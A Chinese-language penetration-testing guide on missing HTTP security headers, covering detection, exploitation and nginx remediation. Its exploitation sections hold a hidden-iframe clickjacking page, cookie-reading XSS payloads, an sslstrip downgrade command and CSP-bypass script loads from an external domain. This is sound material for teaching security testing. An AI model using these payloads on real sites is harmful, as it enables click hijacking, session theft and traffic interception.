# 安全头缺失攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的 HTTP 安全头缺失检测和利用流程。

## 1.2 适用范围

本文档适用于所有 Web 应用，用于检测和利用 HTTP 安全响应头配置缺失的问题。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

HTTP 安全响应头是服务器发送给浏览器的额外指令，用于增强安全性。当这些头缺失或配置不当时，应用可能面临点击劫持、XSS、MIME 嗅探等攻击。

**常见缺失的安全头**：
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security (HSTS)
- Content-Security-Policy (CSP)
- X-XSS-Protection

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-693 | 保护机制失效 |
| CWE-1021 | 点击劫持 |

## 2.2 攻击常见于哪些业务场景

| 缺失的头 | 风险 | 潜在攻击 |
|---------|------|---------|
| X-Frame-Options | 点击劫持 | 诱导用户点击 |
| X-Content-Type-Options | MIME 嗅探 | XSS 攻击 |
| HSTS | 协议降级 | 中间人攻击 |
| CSP | XSS | 脚本注入 |
| X-XSS-Protection | XSS 过滤失效 | XSS 攻击 |

## 2.3 漏洞发现方法

### 2.3.1 安全头检测

```bash
# 检查响应头
curl -I https://target.com/

# 检查以下头是否存在：
# X-Frame-Options: DENY 或 SAMEORIGIN
# X-Content-Type-Options: nosniff
# Strict-Transport-Security: max-age=31536000; includeSubDomains
# Content-Security-Policy: ...
# X-XSS-Protection: 1; mode=block
```

### 2.3.2 在线工具检测

```
使用以下工具：
- securityheaders.com
- observatory.mozilla.org
- https://www.htbridge.com/websec/
```

### 2.3.3 自动化扫描

```bash
# 使用 Nuclei
nuclei -t http/misconfiguration -u https://target.com

# 使用 OWASP ZAP
# 内置安全头扫描规则
```

## 2.4 漏洞利用方法

### 2.4.1 点击劫持（X-Frame-Options 缺失）

```html
<!-- 攻击页面 -->
<iframe src="https://target.com/transfer" 
        style="opacity: 0; position: absolute; top: 100px; left: 100px;">
</iframe>
<div style="position: absolute; top: 100px; left: 100px;">
    <button>点击领取奖品</button>
</div>
```

### 2.4.2 MIME 嗅探攻击（X-Content-Type-Options 缺失）

```html
<!-- 上传包含 XSS 的文件 -->
<!-- 文件内容：<script>alert(1)</script> -->
<!-- 文件名：test.txt -->
<!-- Content-Type: text/plain -->

<!-- 如果浏览器可以嗅探为 HTML -->
<!-- XSS 将执行 -->
```

### 2.4.3 协议降级（HSTS 缺失）

```bash
# 使用 sslstrip 降级
sslstrip -l 8080

# 用户访问 https://target.com
# 被降级为 http://target.com
# 攻击者可以窃听流量
```

### 2.4.4 CSP 绕过导致 XSS

```html
<!-- 如果 CSP 缺失或配置宽松 -->
<!-- 可以直接注入脚本 -->
<script>alert(document.cookie)</script>

<!-- 如果 CSP 允许 inline -->
<!-- 可以使用 onerror 等事件处理器 -->
<img src=x onerror=alert(1)>
```

## 2.5 漏洞利用绕过方法

### 2.5.1 X-Frame-Options 绕过

```html
<!-- 某些配置可能允许特定域 -->
<!-- 尝试子域名 -->
<iframe src="https://sub.target.com/page">

<!-- 尝试相似域名 -->
<iframe src="https://target.com.attacker.com/page">
```

### 2.5.2 CSP 绕过

```html
<!-- 如果 CSP 允许 unsafe-inline -->
<script>alert(1)</script>

<!-- 如果 CSP 允许特定域 -->
<script src="https://allowed-domain.com/malicious.js"></script>

<!-- 如果 CSP 配置 data: -->
<script src="data:text/javascript,alert(1)"></script>
```

---

# 第三部分：附录

## 3.1 安全头测试检查清单

```
□ 检查 X-Frame-Options
□ 检查 X-Content-Type-Options
□ 检查 Strict-Transport-Security
□ 检查 Content-Security-Policy
□ 检查 X-XSS-Protection
□ 检查 Referrer-Policy
□ 检查 Permissions-Policy
```

## 3.2 安全头配置建议

```nginx
# Nginx 配置示例
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
add_header Content-Security-Policy "default-src 'self'" always;
add_header X-XSS-Protection "1; mode=block" always;
```

## 3.3 修复建议

1. **配置所有安全头** - 根据应用需求配置
2. **使用合适值** - 如 X-Frame-Options 设为 DENY
3. **测试配置** - 确保安全头正常工作
4. **定期审查** - 跟进最新安全头标准

---

**参考资源**：
- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers-project/)
- [securityheaders.com](https://securityheaders.com/)
